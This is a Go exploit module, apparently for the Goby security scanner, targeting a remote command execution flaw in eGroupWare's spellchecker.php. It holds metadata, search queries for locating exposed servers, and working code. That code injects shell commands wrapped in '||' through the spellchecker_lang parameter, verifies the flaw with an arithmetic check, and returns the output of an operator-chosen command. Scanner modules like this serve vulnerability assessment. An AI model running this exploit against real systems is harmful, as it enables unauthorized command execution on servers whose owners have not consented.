package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "eGroupWare spellchecker.php RCE",
    "Description": "Egroupware is a multi-user, web-based workpieces suite developed on the basis of customized set of PHP based API. There is a remote command execution vulnerability in spellchecker.php file of egroupware system, which allows attackers to execute arbitrary system commands on vulnerable systems.",
    "Impact": "eGroupWare spellchecker.php RCE",
    "Recommendation": "<p>Strictly filter the data input by users and prohibit the execution of system commands.</p>",
    "Product": "EGROUPWARE-Products",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "eGroupWare 系统 spellchecker.php 文件远程命令执行漏洞",
            "Description": "<p>eGroupWare是一个多用户，在以PHP为基础的API上的定制集为基础开发的，以WEB为基础的工作件套装。</p><p><span style=\"color: var(--primaryFont-color);\">eGroupWare系统spellchecker.php文件存在远程命令执行漏洞，攻击者利用该漏洞可以在脆弱的系统上执行任意系统命令。</span></p>",
            "Impact": "<p>eGroupWare系统spellchecker.php文件存在远程命令执行漏洞，攻击者利用该漏洞可以在脆弱的系统上执行任意系统命令。<br></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户尽快更新修复该漏洞：<a href=\"http://www.egroupware.org/\">http://www.egroupware.org/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Product": "EGROUPWARE-产品",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "eGroupWare spellchecker.php RCE",
            "Description": "Egroupware is a multi-user, web-based workpieces suite developed on the basis of customized set of PHP based API. There is a remote command execution vulnerability in spellchecker.php file of egroupware system, which allows attackers to execute arbitrary system commands on vulnerable systems.",
            "Impact": "eGroupWare spellchecker.php RCE",
            "Recommendation": "<p>Strictly filter the data input by users and prohibit the execution of system commands.<br></p>",
            "Product": "EGROUPWARE-Products",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(body=\"content=\\\"eGroupWare\") || body=\"content=\\\"eGroupWare\"",
    "GobyQuery": "(body=\"content=\\\"eGroupWare\") || body=\"content=\\\"eGroupWare\"",
    "Author": "sharecast.net@gmail.com",
    "Homepage": "http://www.egroupware.org/",
    "DisclosureDate": "2021-05-29",
    "References": [
        "https://github.com/Ret2LC/BetterSploit/blob/e8d1d5f8a41508c2b376c84cb57dbe61f48f38a4/BetterSploit/exploitz/exploitz/eGroupWare-1.14-spellchecker-RCE.py"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10688"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			r1 := rand.Intn(7999999) + 150000
			r2 := rand.Intn(9999999) + 250000
			r3 := fmt.Sprintf("%d", r1+r2)
			cmd := url.QueryEscape(fmt.Sprintf("||expr %d + %d||", r1, r2))
			uri := fmt.Sprintf("/egroupware/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php?spellchecker_lang=egroupware_spellchecker_cmd_exec.nasl%s", cmd)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, r3)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := url.QueryEscape(fmt.Sprintf("||%s||", ss.Params["cmd"].(string)))
			uri := fmt.Sprintf("/egroupware/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php?spellchecker_lang=egroupware_spellchecker_cmd_exec.nasl%s", cmd)
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Error executing") {
					expResult.Success = true
					regexp := regexp.MustCompile(`\\\\n([^']+)`)
					cmdinfo := regexp.FindAllStringSubmatch(resp.Utf8Html, -1)[0][1]
					expResult.Output = cmdinfo
				}
			}
			return expResult
		},
	))
}
